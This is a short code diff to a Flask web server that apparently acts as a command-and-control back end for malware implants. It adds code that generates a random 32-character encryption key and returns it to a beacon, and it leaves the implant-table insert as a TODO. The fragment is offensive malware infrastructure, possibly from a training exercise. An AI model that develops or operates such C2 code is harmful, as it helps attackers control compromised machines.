@@ -1,6 +1,8 @@
 import base64
 import json
 import pymysql
+import random
+import string
 from flask import Flask
 from flask import request
 from flask import make_response
@@ -72,13 +74,15 @@ class WebServer(object):
             process_id = j["p"]
             current_user = j["u"]
 
-            # TO DO: generate a random 32 character encryption key
+            # generates a random 32 character encryption key
+            encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(32))
 
             # TO DO: INSERT an entry into the "implants" table here
 
             # TO DO: "return" random 32 character encryption key in the http response
 
-            return "base64 beacon"
+            # returns generated encryption key in the http response
+            return encryption_key
 
         # exception means it is an rc4 beacon instead
         except Exception as e:
